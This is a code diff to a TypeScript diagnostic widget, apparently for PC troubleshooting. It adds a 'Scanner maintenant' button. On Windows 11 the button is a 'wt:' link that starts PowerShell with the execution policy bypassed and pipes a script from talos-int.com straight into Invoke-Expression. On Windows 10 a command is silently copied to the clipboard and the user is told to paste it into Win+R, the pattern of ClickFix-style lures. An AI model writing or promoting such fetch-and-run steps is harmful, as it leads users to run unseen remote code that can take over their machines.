@@ -7,6 +7,7 @@ let diagReport: any = null;
 let chatHistory: { role: string; content: string }[] = [];
 let pollInterval: ReturnType<typeof setInterval> | null = null;
 let sessionId: string | null = null;
+let __browserResult: any = null;
 
 let dragStartX = 0,
   dragStartY = 0;
@@ -747,6 +748,97 @@ async function apiFetch(url: string, body: any): Promise<any> {
   return data;
 }
 
+// ── Scan navigateur ──────────────────────────────────────────────
+
+function initBrowserScan() {
+  // Lazy-load le module de scan navigateur (~2 Ko)
+  import("./browser-scan.ts").then((m) => m.runBrowserScan());
+}
+
+function showBrowserResult(result: any) {
+  __browserResult = result;
+  const el = document.getElementById("sospc-waiting-browser") as HTMLElement;
+  if (!el) return;
+
+  // Score
+  const scoreEl = el.querySelector(".browser-score-val") as HTMLElement;
+  if (scoreEl) scoreEl.textContent = result.score + "/100";
+
+  const fillEl = el.querySelector(".browser-score-fill") as HTMLElement;
+  if (fillEl) {
+    fillEl.style.background =
+      result.score >= 70
+        ? "#00d4aa"
+        : result.score >= 40
+          ? "#e0af68"
+          : "#f7768e";
+    setTimeout(() => (fillEl.style.width = result.score + "%"), 100);
+  }
+
+  // Alertes
+  const alertsEl = el.querySelector(".browser-alerts") as HTMLElement;
+  if (alertsEl) {
+    alertsEl.innerHTML = (result.alerts || [])
+      .map(
+        (a: any) =>
+          '<span class="browser-alert ' +
+          a.level +
+          '">' +
+          (a.level === "critical"
+            ? "🔴"
+            : a.level === "warning"
+              ? "⚠️"
+              : "✅") +
+          " " +
+          a.title +
+          "</span>",
+      )
+      .join("");
+  }
+
+  // Mise à jour du bouton de scan
+  updateScanTrigger(result.isWin11);
+
+  el.style.display = "block";
+}
+
+function updateScanTrigger(isWin11: boolean) {
+  const trigger = document.getElementById("sospc-scan-trigger") as HTMLElement;
+  if (!trigger) return;
+
+  if (isWin11) {
+    // Lien wt: pour Windows 11 (Windows Terminal intégré)
+    trigger.innerHTML =
+      '<a id="sospc-wt-link" href="wt: -d . powershell.exe -NoProfile -ExecutionPolicy Bypass -Command &quot;$s=\'' +
+      sessionId +
+      '\'; irm https://talos-int.com/diag.ps1 | iex&quot;" class="sospc-wt-btn">🚀 Scanner maintenant (1 clic)</a>' +
+      '<div class="sospc-scan-sub">Windows Terminal va s\'ouvrir automatiquement</div>';
+  } else {
+    // Fallback clipboard + Win+R pour Windows 10
+    const cmd = buildCommand(sessionId || "NOSESSION");
+    navigator.clipboard.writeText(cmd).catch(() => {});
+    trigger.innerHTML =
+      '<div class="sospc-clipboard-instructions">' +
+      '<div class="sospc-clipboard-cmd">' +
+      cmd +
+      "</div>" +
+      '<div class="sospc-clipboard-steps">' +
+      '<span class="sospc-step"><kbd>⊞ Win</kbd> + <kbd>R</kbd></span>' +
+      '<span class="sospc-step"><kbd>Ctrl</kbd> + <kbd>V</kbd></span>' +
+      '<span class="sospc-step"><kbd>Entrée ↵</kbd></span>' +
+      "</div>" +
+      '<div class="sospc-scan-sub">📋 Commande copiée automatiquement</div>' +
+      "</div>";
+  }
+
+  trigger.style.display = "block";
+}
+
+// Écoute le résultat du scan navigateur
+window.addEventListener("sospc:browser-scan-done", (e: any) => {
+  showBrowserResult(e.detail);
+});
+
 function analyzeData() {
   showDiagView();
   (document.getElementById("sospc-header-sub") as HTMLElement).textContent =
@@ -868,6 +960,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
   initDrag();
   restorePosition();
+  initBrowserScan();
 
   const saved = loadState();
   if (saved && saved.diagData && !sessionStorage.getItem("sospc_reset")) {
